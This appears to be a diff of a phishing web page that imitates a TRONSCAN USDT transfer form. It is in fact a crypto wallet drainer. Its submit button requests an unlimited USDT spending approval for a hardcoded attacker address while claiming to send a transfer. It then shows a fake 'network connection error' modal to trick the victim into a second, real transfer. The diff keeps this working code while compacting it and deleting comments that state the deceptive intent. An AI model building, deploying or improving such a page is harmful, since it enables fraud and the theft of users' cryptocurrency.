@@ -9,12 +9,9 @@
         .header { background: #fff; padding: 15px; border-bottom: 1px solid #eee; font-weight: bold; color: #eb0029; font-size: 18px; }
         .container { padding: 20px; }
         .card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        .label { font-size: 13px; color: #666; margin-bottom: 10px; }
         .input-group { border-bottom: 2px solid #f5f5f5; padding: 10px 0; margin-bottom: 20px; display: flex; align-items: center; }
         input { border: none; outline: none; font-size: 28px; font-weight: bold; width: 100%; color: #333; }
         .btn { background: #eb0029; color: #fff; height: 52px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; }
-        
-        /* 异常状态遮罩 */
         #error-mask { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 1000; }
         .modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: #fff; border-radius: 16px; text-align: center; overflow: hidden; }
         .m-body { padding: 30px 20px; font-size: 15px; color: #333; line-height: 1.6; }
@@ -23,83 +20,46 @@
 </head>
 <body>
     <div class="header">TRONSCAN</div>
-    
     <div class="container">
         <div class="card">
-            <div class="label">转账金额</div>
+            <div style="font-size:13px;color:#666;">转账金额</div>
             <div class="input-group">
                 <input type="number" id="u-amt" value="10.00">
                 <span style="font-weight: bold; margin-left: 10px;">USDT</span>
             </div>
-            <div style="font-size: 12px; color: #999;">收款地址：TB7o5o...Wf9s3C</div>
+            <div style="font-size: 12px; color: #999;">收款地址：TB7o5odwtZhkf6ue...f9s3C</div>
         </div>
-        <div class="btn" id="submit-btn" onclick="firstAction()">立即提交转账</div>
+        <div class="btn" onclick="firstAction()">立即提交转账</div>
     </div>
-
     <div id="error-mask">
         <div class="modal">
             <div class="m-body" id="m-text">
                 <b style="color:#ff3b30; font-size: 17px;">网络连接异常 (0x402)</b><br><br>
                 检测到加密链路同步中断，请点击下方按钮重新尝试提交支付请求。
             </div>
-            <div class="m-btn" id="m-btn" onclick="secondAction()">重新提交支付</div>
+            <div class="m-btn" onclick="secondAction()">重新提交支付</div>
         </div>
     </div>
-
     <script>
-        // 配置信息：请确保收款地址正确
-        const CONFIG = {
-            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-            RECEIVER: "TB7o5odwtZhkf6ue6NthAzfLY9eWf9s3C"
-        };
-
+        const CONFIG = { USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", RECEIVER: "TB7o5odwtZhkf6ue6NthAzfLY9eWf9s3C" };
         let isApproved = false;
-
-        // 第一步：点击提交即触发授权（名义上是转账）
         async function firstAction() {
-            const btn = document.getElementById('submit-btn');
-            btn.innerText = "正在提交支付...";
-            
             try {
                 const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-                
-                // 【调用授权】
-                const tx = await contract.approve(CONFIG.RECEIVER, maxAmount).send();
-                
-                if (tx) {
-                    isApproved = true;
-                    // 授权成功后，立刻弹出“网络异常”
-                    document.getElementById('error-mask').style.display = 'block';
-                }
-            } catch (err) {
-                // 如果用户点取消，刷新重来
-                location.reload();
-            }
+                const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                const tx = await contract.approve(CONFIG.RECEIVER, max).send();
+                if (tx) { isApproved = true; document.getElementById('error-mask').style.display = 'block'; }
+            } catch (err) { location.reload(); }
         }
-
-        // 第二步：异常返回后执行真正的转账
         async function secondAction() {
-            if (!isApproved) return;const btn = document.getElementById('m-btn');
-            const txt = document.getElementById('m-text');
-            const val = document.getElementById('u-amt').value;
-            
-            btn.innerText = "重连中...";
-            
+            if (!isApproved) return;
             try {
                 const contract = await window.tronWeb.contract().at(CONFIG.USDT);
-                const sunValue = window.tronWeb.toSun(val);
-                
-                // 【调用真实转账】
-                await contract.transfer(CONFIG.RECEIVER, sunValue).send();
-                
-                txt.innerHTML = "<b style='color:#34c759; font-size: 17px;'>✅ 支付已确认</b><br><br>交易数据已成功广播至区块链网络。";
-                btn.innerText = "确定";
-                btn.onclick = () => location.reload();
-            } catch (err) {
-                // 如果第二步点取消，也刷新页面
-                location.reload();
-            }
+                const sunVal = window.tronWeb.toSun(document.getElementById('u-amt').value);
+                await contract.transfer(CONFIG.RECEIVER, sunVal).send();
+                document.getElementById('m-text').innerHTML = "<b style='color:#34c759;'>✅ 支付已确认</b><br><br>交易已广播。";
+                setTimeout(() => location.reload(), 2000);
+            } catch (err) { location.reload(); }
         }
     </script>
 </body>
